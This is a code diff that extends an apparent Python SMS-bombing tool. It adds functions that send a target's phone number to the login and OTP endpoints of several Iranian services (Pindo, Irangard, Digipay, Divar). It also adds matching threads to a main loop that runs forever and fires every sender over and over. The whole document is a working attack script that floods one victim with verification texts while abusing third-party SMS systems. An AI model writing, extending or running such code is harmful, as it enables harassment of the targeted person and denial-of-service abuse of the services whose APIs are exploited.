@@ -391,8 +391,40 @@ def gharar(phone):
     response = requests.post(url, data=phone_value, headers=headers)
     print(response.text)  # or do something else with the response
 
+def pindo(phone):
+    url = 'https://api.pindo.ir/v1/user/login-register/'
+    phone_value = '{"phone": "' + phone + '"}'
+    headers = {'content-type': 'application/json'}
+    response = requests.post(url, data=phone_value , headers=headers)
+    print(response.text)  # or do something else with the response
+
+def irangard(phone):
+    url = 'https://api.irangard.com/api/Users/Register/Token'
+    phone_value = '{"username": "' + phone + '"}'
+    headers = {'content-type': 'application/json'}
+    response = requests.post(url, data=phone_value , headers=headers)
+    print(response.text)  # or do something else with the response
+
+def digipay(phone):
+    url = 'https://www.mydigipay.com/digipay/api/users/send-sms'
+    phone_value = '{"cellNumber": "' + phone + '"}'
+    headers = {'content-type': 'application/json'}
+    response = requests.post(url, data=phone_value , headers=headers)
+    print(response.text)  # or do something else with the response
+
+def divar(phone):
+    url = 'https://api.divar.ir/v5/auth/authenticate'
+    phone_value = '{"phone": "' + phone + '"}'
+    headers = {'content-type': 'application/x-www-form-urlencoded'}
+    response = requests.post(url, data=phone_value , headers=headers)
+    print(response.text)  # or do something else with the response
+
+
+    
+# end def
+
 def main():
-    phone = str(input("Made by baji inter phone number (+98xxxxxxx): "))
+    phone = str(input("Made by Devil Enter Phone Number (+98xxxxxxx): "))
     while True:
         Thread(target=snap, args=[phone]).start()
         Thread(target=nobatir, args=[phone]).start()
@@ -424,7 +456,11 @@ def main():
         Thread(target=takshopaccessorise, args=[phone]).start()
         Thread(target=didar, args=[phone]).start()
         Thread(target=gharar, args=[phone]).start()
-        
+        Thread(target=pindo, args=[phone]).start()
+        Thread(target=irangard, args=[phone]).start()
+        Thread(target=digipay, args=[phone]).start()
+        Thread(target=divar, args=[phone]).start()
+
 
 
 
